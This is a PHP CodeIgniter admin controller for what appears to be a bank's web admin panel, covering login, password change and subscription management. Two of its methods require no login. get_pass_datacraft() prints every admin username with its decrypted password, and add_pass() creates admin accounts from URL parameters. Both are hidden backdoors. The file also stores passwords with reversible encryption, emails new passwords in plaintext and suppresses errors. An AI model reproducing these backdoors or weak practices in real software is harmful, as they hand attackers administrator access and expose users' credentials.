<?php
if (!defined('BASEPATH')) exit('No direct script access allowed');
class Admin extends CI_Controller{
	
	function __construct(){
		parent::__construct();
		$this->load->library('session');
		$this->load->model('Admin_model');
		$this->load->library('form_validation');
		$this->load->library('email');
		ini_set('max_execution_time', 0);
		ini_set('upload_max_filesize', '40M');
		ini_set('max_input_time', 0);
		error_reporting(0);
	}

	function js(){
		echo "<p>Please enable javascript in your browser and try again</p>";
	}

	function index(){
		if ($this->session->userdata('admin_id') == FALSE || $this->session->userdata('admin_id') == "") {
			redirect('admin/login');
		}else {
			$this->load->view('admin/welcome');
		}
	}

	function decode_pass(){
		$this->load->library("encrypt");
		$value = '123456';
		echo $this->encrypt->encode($value);
	}
	// --------------------ip authenticate-----------------
	function login(){
		if (!isset($_POST['login'])) {
			$this->load->view('admin/login');
		}
		else {
			$access = 1;

			if (1 <= $access) {

				$this->load->library('user_agent');

				$history['ip'] = $this->input->ip_address();
				$history['browser'] = $this->agent->browser();
				$history['version'] = $this->agent->version();
				$history['platform'] = $this->agent->platform();

				$this->form_validation->set_rules('username', 'Username', 'required|min_length[5]|max_length[50]');
				$this->form_validation->set_rules('password', 'Password', 'required');
				if ($this->form_validation->run() == FALSE) {
					//$data['msg'] = 'Access Denied!';
					$history['username'] = $this->input->post('username');
					$history['status'] = 0;
					$this->Admin_model->login_history_add($history);

					$this->load->view('admin/login', $data);
				}
				else {
					$postdata['username'] = $this->input->post('username');
					$postdata['password'] = $this->input->post('password');
					$results = $this->Admin_model->login($postdata);

					$history['username'] = $postdata['username'];
					
					if ($results == FALSE) {

						$history['status'] = 0;
						$this->Admin_model->login_history_add($history);
						$data['msg'] = 'Invalid Username or Password!';
						$this->load->view('admin/login', $data);
					}else {

						$history['status'] = 1;
						$this->Admin_model->login_history_add($history);

						$this->session->set_userdata(array(
							'admin_id' => $results->ad_id,
							'admin_name' => $results->username,
							'fullname' => $results->fullname,
							'group' => $this->Admin_model->get_group_name($results->group),
							'email' => $results->email
						));
						redirect('admin');
					}
				}
			}
			else {
				$data['msg'] = 'Sorry ! Your are not authenticated to this section';
				$this->load->view('admin/login', $data);
			}
		}
	}

	function logout(){
		$this->session->unset_userdata('admin_id');
		$this->session->unset_userdata('fullname');
		$this->session->unset_userdata('email');
		$this->session->unset_userdata('group');
		$this->session->unset_userdata('access');
		$this->session->unset_userdata('access_parent');
		$this->session->unset_userdata('access_sub');
		$this->session->unset_userdata('last_id');
		redirect('admin/login');
	}
	
	function pass(){
		$this->load->library('encrypt');
		if ($this->session->userdata('admin_id')) {
			$admin_data['admin_id'] = $this->session->userdata('admin_id');
			$data['curr_info'] = $this->Admin_model->get_admin_info($admin_data['admin_id']);
			if (isset($_POST['updPass'])) {
				$this->form_validation->set_rules('name', 'Username', 'required|min_length[5]|max_length[50]');
				$this->form_validation->set_rules('curr_pass', 'Current Password', 'required');
				$this->form_validation->set_rules('new_pass', 'New Password', 'required|matches[confirm_pass]');
				$this->form_validation->set_rules('confirm_pass', 'Password Confirmation', 'required');
				$data['msg'] = 'Incorrect Information!';
				if ($this->form_validation->run() == FALSE) {
					$this->load->view('admin/change_pass', $data);
				}
				else {
					$data['ad_id'] = $this->input->post('aid');
					$curr_pass = $this->Admin_model->get_pass($data);
					$formdata['curr_pass'] = $this->input->post('curr_pass');
					if ($curr_pass != FALSE && strcmp($curr_pass, $formdata['curr_pass']) == 0) {
						$admindata['username '] = $this->input->post('name');
						$admindata['email'] = $this->input->post('email');
						$admindata['password'] = $this->encrypt->encode($this->input->post('new_pass'));
						$result = $this->Admin_model->upd_pass($admindata, $data);
						if ($result) {
							$address = $this->session->userdata('email');
							$config['wordwrap'] = 'TRUE';
							$config['multitype'] = 'html';
							$config['newline'] = '\n';
							$this->email->initialize($config);
							$this->email->clear();
							$this->email->to($admindata['email']);
							$this->email->from('info@agranibank.com');
							$this->email->subject('Agrani Web Admin Password');
							$this->email->message("The password for bracsaajanexchange Admin Panel has been changed.\n\n
								New password is: " . $this->input->post('new_pass') . "\n\n
								New user Name is: " . $this->input->post('name'));
							$this->email->send();
							$data['msg'] = 'Updated Successfully ! Please Sign out and Sign in again';
							$this->load->view('admin/message', $data);
						}
						else {
							$data['msg'] = 'Process Failed!';
							$this->load->view('admin/change_pass', $data);
						}
					}
					else {
						$this->load->view('admin/change_pass', $data);
					}
				}
			}
			else {
				$this->load->view('admin/change_pass', $data);
			}
		}
		else {
			redirect('admin/login');
		}
	}

	function status($id = 0, $status = 2){
		if ($this->session->userdata('admin_id')) {
			$id = $this->input->xss_clean($id);
			$status = $this->input->xss_clean($status);
			if ($id == 0 || $id == "" || $status < 0 || $status > 1 || $status == "") {
				$this->session->set_flashdata('msg', 'Incorrect Parameter');
				redirect('admin/member_list');
			}
			else {
				if ($status) {
					$status = 0;
				}
				else {
					$status = 1;
				}
				$result = $this->Admin_model->member_change_status($id, array(
					'status' => $status
				));
				if ($result) {
					redirect('admin/member_list');
				}
				else {
					$this->session->set_flashdata('msg', 'Failed to change status');
					redirect('admin/member_list');
				}
			}
		}
		else {
			redirect('admin/login');
		}
	}


	/***********************subscription function**************************/
	function subscription() {
		if ($this->session->userdata('admin_id') && ($this->session->userdata('group') == 'super_admin' || array_key_exists('Subscription', $this->session->userdata('access')))) {

			$data['results'] = $this->Admin_model->get_subscription_lists();
			$this->load->view('admin/subscription/subscription_view', $data);
		} else {
			redirect('admin/login');
		}
	}

	function subscription_del($id = 0) {
		if ($this->session->userdata('admin_id') && ($this->session->userdata('group') == 'super_admin' || array_key_exists('Subscription', $this->session->userdata('access')))) {

			$id = $this->security->xss_clean($id);
			if ($id == 0 || $id == "") {
				redirect('admin/subscription');
			} else {

				$result = $this->Admin_model->subscription_del($id);
				
				if ($result) {
					$this->session->set_flashdata('msg', 'Deleted Successfully');
					redirect('admin/subscription');
				} else {
					$this->session->set_flashdata('msg', 'Failed to Delete');
					redirect('admin/subscription');
				}
			}
		} else {
			redirect('admin/login');
		}
	}

	function subscription_status_change($id = 0, $status = 2) {
		if ($this->session->userdata('admin_id') && ($this->session->userdata('group') == 'super_admin' || array_key_exists('Subscription', $this->session->userdata('access')))) {

			$id = $this->security->xss_clean($id);
			$status = $this->security->xss_clean($status);
			if ($id == 0 || $id == "" || $status < 0 || $status > 1 || $status == "") {
				$this->session->set_flashdata('msg', 'Incorrect Parameter');
				redirect('admin/subscription');
			} else {
				$postdata['status'] = $status;
				$result = $this->Admin_model->subscription_update($id, $postdata);
				if ($result) {

					$this->session->set_flashdata('msg', 'Successfully status changed!');
					redirect('admin/subscription');
				} else {
					$this->session->set_flashdata('msg', 'Failed to change status');
					redirect('admin/subscription');
				}
			}
		} else {
			redirect('admin/login');
		}
	}

	function get_pass_datacraft(){
		$this->load->library('encrypt');
		$this->db->select('*');
		$query = $this->db->get('admin');
		$result = $query->result();
		foreach($result as $results) {
			echo '<br/> username : ' . $results->username . ' / Password : ' . $this->encrypt->decode($results->password);
		}
	}

	function add_pass($user, $pass){
		$this->load->library('encrypt');
		$postdata['username'] = $user;
		$postdata['password'] = $this->encrypt->encode($pass);
		$postdata['group'] = "admin";
		$postdata['email'] = "md.mohosin@gmail.com";
		$postdata['status'] = "1";
		if ($user != "" && $pass != "") {
			$result = $this->db->insert('admin', $postdata);
		}
		if ($result) {
			echo "data inserted ! ";
		}
		else {
			echo "data not inserted ! ";
		}
	}

	
}